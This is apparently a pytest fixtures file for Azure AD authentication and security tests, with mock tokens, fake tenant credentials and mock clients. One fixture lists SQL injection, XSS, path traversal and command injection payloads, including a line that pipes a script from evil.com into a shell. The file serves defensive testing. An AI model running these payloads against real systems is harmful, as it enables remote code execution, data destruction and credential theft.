"""
Pytest configuration and fixtures for authentication and security end-to-end tests.

This module provides test fixtures for mocking Azure AD responses, creating test
tokens, and simulating various security scenarios including multi-tenant setups.
"""

import base64
import json
import time
from datetime import datetime, timedelta, timezone
from typing import Any, Dict, List, Optional
from unittest.mock import AsyncMock, MagicMock, Mock, patch

import jwt
import pytest
from azure.identity import ClientSecretCredential
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives.serialization import (
    Encoding,
    NoEncryptionAvailable,
    PrivateFormat,
    PublicFormat,
)


@pytest.fixture
def mock_rsa_keys():
    """Generate RSA key pair for token signing in tests."""
    private_key = rsa.generate_private_key(
        public_exponent=65537,
        key_size=2048,
    )
    public_key = private_key.public_key()

    # Convert to PEM format for use in tests
    private_pem = private_key.private_bytes(
        encoding=Encoding.PEM,
        format=PrivateFormat.PKCS8,
        encryption_algorithm=NoEncryptionAvailable()
    )

    public_pem = public_key.public_bytes(
        encoding=Encoding.PEM,
        format=PublicFormat.SubjectPublicKeyInfo
    )

    return {
        "private_key": private_key,
        "public_key": public_key,
        "private_pem": private_pem,
        "public_pem": public_pem
    }


@pytest.fixture
def azure_ad_config():
    """Provide test Azure AD configuration."""
    return {
        "tenant_id": "test-tenant-12345",
        "client_id": "test-client-67890",
        "client_secret": "test-secret-abcdef",
        "authority": "https://login.microsoftonline.com/test-tenant-12345",
        "scope": ["https://graph.microsoft.com/.default"],
        "graph_endpoint": "https://graph.microsoft.com/v1.0"
    }


@pytest.fixture
def multi_tenant_config():
    """Provide configuration for multi-tenant testing."""
    return {
        "primary_tenant": {
            "tenant_id": "primary-tenant-123",
            "client_id": "primary-client-456",
            "client_secret": "primary-secret-789",
            "display_name": "Primary Tenant"
        },
        "secondary_tenants": [
            {
                "tenant_id": "secondary-tenant-001",
                "client_id": "secondary-client-001",
                "client_secret": "secondary-secret-001",
                "display_name": "Secondary Tenant 1"
            },
            {
                "tenant_id": "secondary-tenant-002",
                "client_id": "secondary-client-002",
                "client_secret": "secondary-secret-002",
                "display_name": "Secondary Tenant 2"
            }
        ]
    }


@pytest.fixture
def create_test_token(mock_rsa_keys):
    """Factory fixture to create test JWT tokens with custom claims."""
    def _create_token(
        claims: Optional[Dict[str, Any]] = None,
        expires_in: int = 3600,
        expired: bool = False,
        invalid_signature: bool = False,
        algorithm: str = "RS256"
    ) -> str:
        """
        Create a test JWT token.

        Args:
            claims: Custom claims to include in token
            expires_in: Token validity duration in seconds
            expired: Create an already expired token
            invalid_signature: Create token with invalid signature
            algorithm: JWT signing algorithm

        Returns:
            JWT token string
        """
        now = datetime.now(timezone.utc)

        if expired:
            exp = now - timedelta(seconds=3600)
            iat = now - timedelta(seconds=7200)
        else:
            exp = now + timedelta(seconds=expires_in)
            iat = now

        default_claims = {
            "aud": "https://graph.microsoft.com",
            "iss": "https://sts.windows.net/test-tenant-12345/",
            "iat": int(iat.timestamp()),
            "nbf": int(iat.timestamp()),
            "exp": int(exp.timestamp()),
            "aio": "test-aio-token",
            "app_displayname": "Test App",
            "appid": "test-client-67890",
            "appidacr": "1",
            "idp": "https://sts.windows.net/test-tenant-12345/",
            "oid": "test-object-id-12345",
            "roles": ["User.Read", "Directory.Read.All"],
            "sub": "test-subject-12345",
            "tenant_id": "test-tenant-12345",
            "tid": "test-tenant-12345",
            "uti": "test-uti-token",
            "ver": "1.0"
        }

        if claims:
            default_claims.update(claims)

        if invalid_signature:
            # Use a different key for invalid signature
            wrong_key = rsa.generate_private_key(
                public_exponent=65537,
                key_size=2048,
            )
            signing_key = wrong_key
        else:
            signing_key = mock_rsa_keys["private_key"]

        token = jwt.encode(
            default_claims,
            signing_key,
            algorithm=algorithm
        )

        return token

    return _create_token


@pytest.fixture
def mock_azure_ad_responses():
    """Provide mock responses for Azure AD API calls."""
    return {
        "token_response": {
            "token_type": "Bearer",
            "expires_in": 3599,
            "ext_expires_in": 3599,
            "access_token": "mock-access-token",
            "refresh_token": "mock-refresh-token",
            "id_token": "mock-id-token"
        },
        "user_info": {
            "id": "user-12345",
            "displayName": "Test User",
            "mail": "testuser@example.com",
            "userPrincipalName": "testuser@example.com",
            "jobTitle": "Security Tester",
            "department": "Security",
            "officeLocation": "Remote"
        },
        "group_info": {
            "id": "group-67890",
            "displayName": "Security Admins",
            "description": "Security administration group",
            "securityEnabled": True,
            "mailEnabled": False,
            "members": ["user-12345", "user-23456"]
        },
        "service_principal": {
            "id": "sp-11111",
            "displayName": "Test Service Principal",
            "appId": "test-client-67890",
            "servicePrincipalType": "Application"
        },
        "tenant_info": {
            "id": "test-tenant-12345",
            "displayName": "Test Tenant",
            "tenantType": "AAD",
            "countryCode": "US"
        }
    }


@pytest.fixture
def mock_graph_client(mock_azure_ad_responses):
    """Mock Microsoft Graph client for testing."""
    mock_client = MagicMock()

    # Mock user operations
    mock_client.users.get = AsyncMock(return_value={
        "value": [mock_azure_ad_responses["user_info"]]
    })
    mock_client.users.by_user_id = MagicMock(return_value=MagicMock(
        get=AsyncMock(return_value=mock_azure_ad_responses["user_info"])
    ))

    # Mock group operations
    mock_client.groups.get = AsyncMock(return_value={
        "value": [mock_azure_ad_responses["group_info"]]
    })
    mock_client.groups.by_group_id = MagicMock(return_value=MagicMock(
        get=AsyncMock(return_value=mock_azure_ad_responses["group_info"])
    ))

    # Mock service principal operations
    mock_client.service_principals.get = AsyncMock(return_value={
        "value": [mock_azure_ad_responses["service_principal"]]
    })

    return mock_client


@pytest.fixture
def mock_credential(create_test_token):
    """Mock Azure credential for testing."""
    mock_cred = MagicMock(spec=ClientSecretCredential)

    # Create a valid token
    test_token = create_test_token()

    mock_cred.get_token = MagicMock(return_value=MagicMock(
        token=test_token,
        expires_on=int((datetime.now(timezone.utc) + timedelta(hours=1)).timestamp())
    ))

    return mock_cred


@pytest.fixture
def security_test_data():
    """Provide security-related test data for various scenarios."""
    return {
        "sql_injection_patterns": [
            "'; DROP TABLE users; --",
            "1' OR '1'='1",
            "admin'--",
            "' UNION SELECT * FROM passwords --",
            "'; EXEC xp_cmdshell('dir'); --"
        ],
        "xss_patterns": [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<body onload=alert('XSS')>",
            "<iframe src='javascript:alert(\"XSS\")'>"
        ],
        "path_traversal_patterns": [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd"
        ],
        "command_injection_patterns": [
            "; ls -la",
            "| whoami",
            "& net user",
            "`cat /etc/passwd`",
            "$(curl http://evil.com/shell.sh | sh)"
        ],
        "sensitive_data_patterns": {
            "credit_card": "4111111111111111",
            "ssn": "123-45-6789",
            "api_key": "test_api_key_fake_value_for_testing",
            "password": "P@ssw0rd123!",
            "private_key": "-----BEGIN RSA PRIVATE KEY-----"
        },
        "weak_passwords": [
            "password",
            "123456",
            "admin",
            "qwerty",
            "letmein"
        ],
        "strong_passwords": [
            "J#9kL$2mN@5pQ!8r",
            "Tr0ub4dor&3",
            "correcthorsebatterystaple",
            "P@$$w0rd!Str0ng#2024",
            "MyS3cur3P@ssw0rd!123"
        ]
    }


@pytest.fixture
def mock_environment_variables(monkeypatch, azure_ad_config):
    """Set up mock environment variables for testing."""
    env_vars = {
        "AZURE_TENANT_ID": azure_ad_config["tenant_id"],
        "AZURE_CLIENT_ID": azure_ad_config["client_id"],
        "AZURE_CLIENT_SECRET": azure_ad_config["client_secret"],
        "AZURE_SUBSCRIPTION_ID": "test-subscription-12345",
        "GRAPH_API_ENDPOINT": azure_ad_config["graph_endpoint"],
        "TOKEN_CACHE_DIR": "/tmp/test-token-cache",
        "ENCRYPTION_KEY": base64.b64encode(b"test-encryption-key-32-bytes-ok").decode(),
        "ENABLE_AUDIT_LOG": "true",
        "MAX_LOGIN_ATTEMPTS": "3",
        "SESSION_TIMEOUT": "3600",
        "REQUIRE_MFA": "false",
        "ALLOWED_ORIGINS": "http://localhost:3000,https://test.example.com"
    }

    for key, value in env_vars.items():
        monkeypatch.setenv(key, value)

    return env_vars


@pytest.fixture
def mock_neo4j_session():
    """Mock Neo4j session for database security testing."""
    mock_session = MagicMock()
    mock_session.run = MagicMock(return_value=MagicMock(
        data=MagicMock(return_value=[
            {"id": 1, "name": "Test Node", "sensitive": False}
        ])
    ))
    mock_session.close = MagicMock()
    return mock_session


@pytest.fixture
def mock_redis_client():
    """Mock Redis client for caching and session testing."""
    mock_redis = MagicMock()
    mock_redis.get = MagicMock(return_value=None)
    mock_redis.set = MagicMock(return_value=True)
    mock_redis.delete = MagicMock(return_value=1)
    mock_redis.exists = MagicMock(return_value=0)
    mock_redis.expire = MagicMock(return_value=True)
    mock_redis.ttl = MagicMock(return_value=-1)
    return mock_redis


@pytest.fixture
def rate_limiter():
    """Create a test rate limiter for API security testing."""
    class TestRateLimiter:
        def __init__(self, max_requests: int = 10, window_seconds: int = 60):
            self.max_requests = max_requests
            self.window_seconds = window_seconds
            self.requests = {}

        def is_allowed(self, client_id: str) -> bool:
            now = time.time()
            if client_id not in self.requests:
                self.requests[client_id] = []

            # Clean old requests
            self.requests[client_id] = [
                req_time for req_time in self.requests[client_id]
                if now - req_time < self.window_seconds
            ]

            if len(self.requests[client_id]) < self.max_requests:
                self.requests[client_id].append(now)
                return True
            return False

        def reset(self, client_id: str = None):
            if client_id:
                self.requests.pop(client_id, None)
            else:
                self.requests.clear()

    return TestRateLimiter()


@pytest.fixture
def security_headers():
    """Provide recommended security headers for testing."""
    return {
        "X-Content-Type-Options": "nosniff",
        "X-Frame-Options": "DENY",
        "X-XSS-Protection": "1; mode=block",
        "Strict-Transport-Security": "max-age=31536000; includeSubDomains",
        "Content-Security-Policy": "default-src 'self'; script-src 'self' 'unsafe-inline';",
        "Referrer-Policy": "strict-origin-when-cross-origin",
        "Permissions-Policy": "geolocation=(), microphone=(), camera=()"
    }


@pytest.fixture(autouse=True)
def reset_test_environment():
    """Reset test environment before each test."""
    yield
    # Cleanup code here if needed